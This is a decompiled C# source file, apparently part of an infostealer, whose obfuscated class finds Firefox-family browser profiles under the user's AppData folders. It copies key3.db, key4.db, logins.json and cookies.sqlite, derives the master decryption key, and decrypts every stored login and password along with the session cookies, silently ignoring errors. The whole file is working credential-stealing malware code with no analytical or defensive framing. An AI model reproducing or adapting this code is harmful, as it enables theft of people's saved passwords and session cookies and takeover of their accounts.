using NoiseMe.Drags.App.Data.Gecko;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.DTO.Linq;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.Delegates;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public class hhhh6r : GH9kf<BrowserProfile>
	{
		public List<BrowserProfile> EnumerateData()
		{
			List<BrowserProfile> list = new List<BrowserProfile>();
			try
			{
				List<string> list2 = new List<string>();
				list2.AddRange(rcvr.FindPaths(strg.LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
				list2.AddRange(rcvr.FindPaths(strg.RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
				foreach (string item in list2)
				{
					string fullName = new FileInfo(item).Directory.FullName;
					string text = item.Contains(strg.RoamingAppData) ? prbn(fullName) : plbn(fullName);
					if (!string.IsNullOrEmpty(text))
					{
						BrowserProfile browserProfile = new BrowserProfile
						{
							Name = text,
							Profile = new DirectoryInfo(fullName).Name,
							BrowserCookies = new List<BrowserCookie>(CookMhn(fullName)).IsNull(),
							BrowserCredendtials = new List<BrowserCredendtial>(Creds(fullName).IsNull()).IsNull()
						};
						if (browserProfile.BrowserCookies.Count((BrowserCookie x) => x.IsNotNull()) > 0 || browserProfile.BrowserCredendtials.Count((BrowserCredendtial x) => x.IsNotNull()) > 0)
						{
							list.Add(browserProfile);
						}
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}

		public List<BrowserCredendtial> Creds(string profile)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					list.AddRange(Lopos(profile, p3k(rcvr.CreateTempCopy(Path.Combine(profile, "key3.db")))));
				}
				if (!File.Exists(Path.Combine(profile, "key4.db")))
				{
					return list;
				}
				list.AddRange(Lopos(profile, p4k(rcvr.CreateTempCopy(Path.Combine(profile, "key4.db")))));
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}

		public List<BrowserCookie> CookMhn(string profile)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profile, "cookies.sqlite");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cNT = new CNT(rcvr.CreateTempCopy(text));
				cNT.ReadTable("moz_cookies");
				for (int i = 0; i < cNT.RowLength; i++)
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = cNT.ParseValue(i, "host").Trim(),
							Http = (cNT.ParseValue(i, "isSecure") == "1"),
							Path = cNT.ParseValue(i, "path").Trim(),
							Secure = (cNT.ParseValue(i, "isSecure") == "1"),
							Expires = cNT.ParseValue(i, "expiry").Trim(),
							Name = cNT.ParseValue(i, "name").Trim(),
							Value = cNT.ParseValue(i, "value")
						};
					}
					catch
					{
					}
					if (browserCookie != null)
					{
						list.Add(browserCookie);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}

		public List<BrowserCredendtial> Lopos(string profile, byte[] privateKey)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string path = rcvr.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (File.Exists(path))
				{
					{
						foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
						{
							???????????? ???????????? = ??????.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
							???????????? ????????????2 = ??????.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
							string text = Regex.Replace(????67??.lTRjlt(privateKey, ????????????.Objects[0].Objects[1].Objects[1].ObjectData, ????????????.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
							string text2 = Regex.Replace(????67??.lTRjlt(privateKey, ????????????2.Objects[0].Objects[1].Objects[1].ObjectData, ????????????2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
							BrowserCredendtial browserCredendtial = new BrowserCredendtial
							{
								URL = (string.IsNullOrEmpty(item["hostname"].ToString(saving: false)) ? "UNKNOWN" : item["hostname"].ToString(saving: false)),
								Login = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
								Password = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
							};
							if (browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
							{
								list.Add(browserCredendtial);
							}
						}
						return list;
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}

		private static byte[] p4k(string file)
		{
			byte[] result = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return result;
				}
				CNT cNT = new CNT(file);
				cNT.ReadTable("metaData");
				string s = cNT.ParseValue(0, "item1");
				string s2 = cNT.ParseValue(0, "item2)");
				???????????? ???????????? = ??????.Create(Encoding.Default.GetBytes(s2));
				byte[] objectData = ????????????.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				byte[] objectData2 = ????????????.Objects[0].Objects[1].ObjectData;
				??6?????????? ??6?????????? = new ??6??????????(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				??6??????????.????7????();
				????67??.lTRjlt(??6??????????.DataKey, ??6??????????.DataIV, objectData2);
				cNT.ReadTable("nssPrivate");
				int rowLength = cNT.RowLength;
				string s3 = string.Empty;
				for (int i = 0; i < rowLength; i++)
				{
					if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(strg.Key4MagicNumber))
					{
						s3 = cNT.ParseValue(i, "a11");
						break;
					}
				}
				???????????? ????????????2 = ??????.Create(Encoding.Default.GetBytes(s3));
				objectData = ????????????2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				objectData2 = ????????????2.Objects[0].Objects[1].ObjectData;
				??6?????????? = new ??6??????????(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				??6??????????.????7????();
				result = Encoding.Default.GetBytes(????67??.lTRjlt(??6??????????.DataKey, ??6??????????.DataIV, objectData2, PaddingMode.PKCS7));
				return result;
			}
			catch (Exception)
			{
				return result;
			}
		}

		private static byte[] p3k(string file)
		{
			byte[] array = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return array;
				}
				new DataTable();
				??????6 berkeleyDB = new ??????6(file);
				??6?? ??6?? = new ??6??(vbv(berkeleyDB, (string x) => x.Equals("password-check")));
				string hexString = vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
				??6?????????? ??6?????????? = new ??6??????????(rcvr.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), rcvr.ConvertHexStringToByteArray(??6??.EntrySalt));
				??6??????????.????7????();
				????67??.lTRjlt(??6??????????.DataKey, ??6??????????.DataIV, rcvr.ConvertHexStringToByteArray(??6??.Passwordcheck));
				???????????? ???????????? = ??????.Create(rcvr.ConvertHexStringToByteArray(vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
				??6?????????? ??6??????????2 = new ??6??????????(rcvr.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ????????????.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
				??6??????????2.????7????();
				???????????? ????????????2 = ??????.Create(??????.Create(Encoding.Default.GetBytes(????67??.lTRjlt(??6??????????2.DataKey, ??6??????????2.DataIV, ????????????.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
				if (????????????2.Objects[0].Objects[3].ObjectData.Length <= 24)
				{
					array = ????????????2.Objects[0].Objects[3].ObjectData;
					return array;
				}
				Array.Copy(????????????2.Objects[0].Objects[3].ObjectData, ????????????2.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
				return array;
			}
			catch (Exception)
			{
				return array;
			}
		}

		private static string vbv(??????6 berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
				{
					if (predicate(key.Key))
					{
						text = key.Value;
					}
				}
			}
			catch (Exception)
			{
			}
			return text.Replace("-", string.Empty);
		}

		private static string prbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[1]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		private static string plbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[1]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}
	}
}
